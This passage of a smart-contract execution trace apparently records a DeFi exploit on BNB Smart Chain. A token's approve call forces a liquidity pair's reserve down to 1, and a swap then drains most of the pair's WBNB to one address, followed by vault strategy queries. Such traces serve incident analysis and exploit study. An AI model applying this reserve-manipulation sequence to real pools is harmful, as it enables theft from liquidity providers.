    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0xE38EBFE8F314dcaD61d5aDCB29c1A26F41BEd0Be, to: 0xBFa618F7B7078bE3B00F5CcfB85907083EFAB9F0, value: 97994052010212825 [9.799e16])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Approval(owner: 0xE38EBFE8F314dcaD61d5aDCB29c1A26F41BEd0Be, spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 115792089237316195423570985008687907853269984665640564039457486013861119427110 [1.157e77])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [91502] 0xBFa618F7B7078bE3B00F5CcfB85907083EFAB9F0::mint(0xE38EBFE8F314dcaD61d5aDCB29c1A26F41BEd0Be)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [841] 0x4269e4090FF9dFc99D8846eB0D42E67F01C3AC8b::balanceOf(0xBFa618F7B7078bE3B00F5CcfB85907083EFAB9F0) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 98044021765772833 [9.804e16]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xBFa618F7B7078bE3B00F5CcfB85907083EFAB9F0) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 393653846565350521391470 [3.936e23]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2354] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73::feeTo() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x07d80AE6f36A5E08Dca74cE884A24D39dB9934ed
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x07d80AE6f36A5E08Dca74cE884A24D39dB9934ed, value: 40804656345245 [4.08e13])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0xE38EBFE8F314dcaD61d5aDCB29c1A26F41BEd0Be, value: 196186747458963711715 [1.961e20])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Sync(reserve0: 98044021765772833 [9.804e16], reserve1: 393653846565350521391470 [3.936e23])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Mint(sender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, amount0: 97994052010212825 [9.799e16], amount1: 393453214378564865361669 [3.934e23])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 196186747458963711715 [1.961e20]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 393453214378564865361669 [3.934e23], 97994052010212825 [9.799e16], 196186747458963711715 [1.961e20]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [537] 0xBFa618F7B7078bE3B00F5CcfB85907083EFAB9F0::balanceOf(0xE38EBFE8F314dcaD61d5aDCB29c1A26F41BEd0Be) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 196186747458963711715 [1.961e20]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [25203] 0xBFa618F7B7078bE3B00F5CcfB85907083EFAB9F0::transfer(0x7Af938f0EFDD98Dc513109F6A7E85106D26E16c4, 196186747458963711715 [1.961e20])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0xE38EBFE8F314dcaD61d5aDCB29c1A26F41BEd0Be, to: 0x7Af938f0EFDD98Dc513109F6A7E85106D26E16c4, value: 196186747458963711715 [1.961e20])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2420] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::approve(0x10ED43C718714eb63d5aA57B78B54704E256024E, 0)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Approval(owner: 0xE38EBFE8F314dcaD61d5aDCB29c1A26F41BEd0Be, spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 0)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [757045] 0x4269e4090FF9dFc99D8846eB0D42E67F01C3AC8b::approve(0x10ED43C718714eb63d5aA57B78B54704E256024E, 0)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xCB36b1ee0Af68Dce5578a487fF2Da81282512233) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 273813109335418386629 [2.738e20]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [676] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73::getPair(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0x4269e4090FF9dFc99D8846eB0D42E67F01C3AC8b)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0xBFa618F7B7078bE3B00F5CcfB85907083EFAB9F0
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [9287] 0xBFa618F7B7078bE3B00F5CcfB85907083EFAB9F0::sync()
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [841] 0x4269e4090FF9dFc99D8846eB0D42E67F01C3AC8b::balanceOf(0xBFa618F7B7078bE3B00F5CcfB85907083EFAB9F0) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 1
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xBFa618F7B7078bE3B00F5CcfB85907083EFAB9F0) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 393653846565350521391470 [3.936e23]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Sync(reserve0: 1, reserve1: 393653846565350521391470 [3.936e23])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xBFa618F7B7078bE3B00F5CcfB85907083EFAB9F0) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 393653846565350521391470 [3.936e23]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [465] 0xBFa618F7B7078bE3B00F5CcfB85907083EFAB9F0::token0()
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x4269e4090FF9dFc99D8846eB0D42E67F01C3AC8b
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [465] 0xBFa618F7B7078bE3B00F5CcfB85907083EFAB9F0::token0()
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x4269e4090FF9dFc99D8846eB0D42E67F01C3AC8b
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [21465] 0xBFa618F7B7078bE3B00F5CcfB85907083EFAB9F0::swap(0, 393653746565350521391470 [3.936e23], 0xCB36b1ee0Af68Dce5578a487fF2Da81282512233, 0x)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [6062] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::transfer(0xCB36b1ee0Af68Dce5578a487fF2Da81282512233, 393653746565350521391470 [3.936e23])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0xBFa618F7B7078bE3B00F5CcfB85907083EFAB9F0, to: 0xCB36b1ee0Af68Dce5578a487fF2Da81282512233, value: 393653746565350521391470 [3.936e23])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [841] 0x4269e4090FF9dFc99D8846eB0D42E67F01C3AC8b::balanceOf(0xBFa618F7B7078bE3B00F5CcfB85907083EFAB9F0) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 5192296858534827628530496329220095 [5.192e33]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xBFa618F7B7078bE3B00F5CcfB85907083EFAB9F0) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 100000000000000000 [1e17]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Sync(reserve0: 5192296858534827628530496329220095 [5.192e33], reserve1: 100000000000000000 [1e17])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Swap(sender: 0x4269e4090FF9dFc99D8846eB0D42E67F01C3AC8b, amount0In: 5192296858534827628530496329220094 [5.192e33], amount1In: 0, amount0Out: 0, amount1Out: 393653746565350521391470 [3.936e23], to: 0xCB36b1ee0Af68Dce5578a487fF2Da81282512233)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [9287] 0xBFa618F7B7078bE3B00F5CcfB85907083EFAB9F0::sync()
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [841] 0x4269e4090FF9dFc99D8846eB0D42E67F01C3AC8b::balanceOf(0xBFa618F7B7078bE3B00F5CcfB85907083EFAB9F0) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 100000000000000000 [1e17]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xBFa618F7B7078bE3B00F5CcfB85907083EFAB9F0) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 100000000000000000 [1e17]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Sync(reserve0: 100000000000000000 [1e17], reserve1: 100000000000000000 [1e17])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [164761] 0x2B4f87D9d0A32A04B2D045fd5927cb57bEdB076e::getBestStrategy() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [35676] 0xb43410A271C71f2FDA2D1ED9C1165e924Be159D9::balanceOf() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [3104] 0xd7D069493685A581d27824Fc46EdA46B7EfC0063::totalSupply() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2364] 0x7EEAA96bf1aBaA206615046c0991E678a2b12Da1::totalSupply() [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 793300839274045174646136 [7.933e23]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 793300839274045174646136 [7.933e23]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2846] 0xd7D069493685A581d27824Fc46EdA46B7EfC0063::totalToken() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2106] 0x7EEAA96bf1aBaA206615046c0991E678a2b12Da1::totalToken() [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xd7D069493685A581d27824Fc46EdA46B7EfC0063) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 5640626957589713000405 [5.64e21]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000572d1c8d1e188103eb53
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000572d1c8d1e188103eb53
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [9285] 0xA625AB01B08ce023B2a342Dbb12a16f2C8489A8F::userInfo(1, 0xb43410A271C71f2FDA2D1ED9C1165e924Be159D9) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 60955393982519636743013 [6.095e22], 2826042283495043367339022 [2.826e24]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [3537] 0xd7D069493685A581d27824Fc46EdA46B7EfC0063::balanceOf(0xb43410A271C71f2FDA2D1ED9C1165e924Be159D9) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2794] 0x7EEAA96bf1aBaA206615046c0991E678a2b12Da1::balanceOf(0xb43410A271C71f2FDA2D1ED9C1165e924Be159D9) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xb43410A271C71f2FDA2D1ED9C1165e924Be159D9) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x0000000000000000000000000000000000000000000006b2cb86333f170ffe12
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [49805] 0xeDc4050bE30300E366f6A742E9Ee7902e72d5d96::balanceOf() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [9673] 0xa900A6291d3A49B1b555b40bd6277D56228B690b::totalSupply() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2433] 0x8dB1d72467dc02a0974E52D131736438f3C34D61::totalSupply() [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 10909322729467335744224 [1.09e22]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 10909322729467335744224 [1.09e22]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [10627] 0xa900A6291d3A49B1b555b40bd6277D56228B690b::totalToken() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [9887] 0x8dB1d72467dc02a0974E52D131736438f3C34D61::totalToken() [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xa900A6291d3A49B1b555b40bd6277D56228B690b) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 10909322729467335744224 [1.09e22]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000024f65441661ab6d1ae0
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000024f65441661ab6d1ae0
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [6865] 0xDaC4d0EE7B55497E96b73a53b31A2B47ABb7b5a8::userInfo(0, 0xeDc4050bE30300E366f6A742E9Ee7902e72d5d96) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 1193568351189769011833 [1.193e21], 7546058860083590777618 [7.546e21]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [3274] 0xa900A6291d3A49B1b555b40bd6277D56228B690b::balanceOf(0xeDc4050bE30300E366f6A742E9Ee7902e72d5d96) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2531] 0x8dB1d72467dc02a0974E52D131736438f3C34D61::balanceOf(0xeDc4050bE30300E366f6A742E9Ee7902e72d5d96) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xeDc4050bE30300E366f6A742E9Ee7902e72d5d96) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x000000000000000000000000000000000000000000000040b4169b9c66de4279
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [19550] 0xa8C9357dD25188f5E5954DC25509f92c44F38740::balanceOf() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [6873] 0x07dE034A0Fc0DA7a0bf703F6DcA7025bcD61BA3e::userInfo(2, 0xa8C9357dD25188f5E5954DC25509f92c44F38740) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 24228113350502997257692 [2.422e22], 7408868011005831571933 [7.408e21]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xa8C9357dD25188f5E5954DC25509f92c44F38740) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x000000000000000000000000000000000000000000000521689db63c86536ddc
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [11176] 0xb43410A271C71f2FDA2D1ED9C1165e924Be159D9::balanceOf() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1104] 0xd7D069493685A581d27824Fc46EdA46B7EfC0063::totalSupply() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [364] 0x7EEAA96bf1aBaA206615046c0991E678a2b12Da1::totalSupply() [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 793300839274045174646136 [7.933e23]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 793300839274045174646136 [7.933e23]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2846] 0xd7D069493685A581d27824Fc46EdA46B7EfC0063::totalToken() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2106] 0x7EEAA96bf1aBaA206615046c0991E678a2b12Da1::totalToken() [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xd7D069493685A581d27824Fc46EdA46B7EfC0063) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 5640626957589713000405 [5.64e21]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000572d1c8d1e188103eb53
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000572d1c8d1e188103eb53
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1285] 0xA625AB01B08ce023B2a342Dbb12a16f2C8489A8F::userInfo(1, 0xb43410A271C71f2FDA2D1ED9C1165e924Be159D9) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 60955393982519636743013 [6.095e22], 2826042283495043367339022 [2.826e24]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1537] 0xd7D069493685A581d27824Fc46EdA46B7EfC0063::balanceOf(0xb43410A271C71f2FDA2D1ED9C1165e924Be159D9) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [794] 0x7EEAA96bf1aBaA206615046c0991E678a2b12Da1::balanceOf(0xb43410A271C71f2FDA2D1ED9C1165e924Be159D9) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xb43410A271C71f2FDA2D1ED9C1165e924Be159D9) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x0000000000000000000000000000000000000000000006b2cb86333f170ffe12
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [10305] 0xeDc4050bE30300E366f6A742E9Ee7902e72d5d96::balanceOf() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1173] 0xa900A6291d3A49B1b555b40bd6277D56228B690b::totalSupply() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [433] 0x8dB1d72467dc02a0974E52D131736438f3C34D61::totalSupply() [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 10909322729467335744224 [1.09e22]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 10909322729467335744224 [1.09e22]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2627] 0xa900A6291d3A49B1b555b40bd6277D56228B690b::totalToken() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1887] 0x8dB1d72467dc02a0974E52D131736438f3C34D61::totalToken() [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xa900A6291d3A49B1b555b40bd6277D56228B690b) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 10909322729467335744224 [1.09e22]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000024f65441661ab6d1ae0
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000024f65441661ab6d1ae0
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [865] 0xDaC4d0EE7B55497E96b73a53b31A2B47ABb7b5a8::userInfo(0, 0xeDc4050bE30300E366f6A742E9Ee7902e72d5d96) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 1193568351189769011833 [1.193e21], 7546058860083590777618 [7.546e21]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1274] 0xa900A6291d3A49B1b555b40bd6277D56228B690b::balanceOf(0xeDc4050bE30300E366f6A742E9Ee7902e72d5d96) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [531] 0x8dB1d72467dc02a0974E52D131736438f3C34D61::balanceOf(0xeDc4050bE30300E366f6A742E9Ee7902e72d5d96) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xeDc4050bE30300E366f6A742E9Ee7902e72d5d96) [staticcall]
